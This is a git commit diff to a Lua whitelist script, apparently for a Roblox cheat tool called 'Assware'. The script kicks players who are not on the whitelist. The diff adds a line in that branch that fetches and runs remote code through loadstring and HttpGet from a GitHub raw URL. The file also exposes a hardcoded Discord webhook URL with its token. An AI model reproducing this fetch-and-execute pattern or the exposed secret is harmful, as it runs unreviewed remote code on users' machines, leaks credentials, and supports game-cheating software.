dbcad983c853709d3618f825981889d260f0e67d
helplynch <108618400+helplynch@users.noreply.github.com>
2023-10-14 12:12:56 -0400

    Update whitelist.lua

--- whitelist.lua
+++ whitelist.lua
@@ -30,7 +30,7 @@ if players[username] == true then
 else
 	game.Players.LocalPlayer:Kick("You dont have access to Assware, please open a ticket in the server if you bought the gamepass and need access")
 	local url = "https://discord.com/api/webhooks/1162210538852450334/z0yFuSUNlm8vvVzsJQWvVOhGX1e58HU9HT841I-_VZg0EG_3ke5ggoOiyr1iov5DOZZ0"
-	
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/helplynch/cheetsxd/main/bdmsg.lua"))()
 end
 
 if down == true then
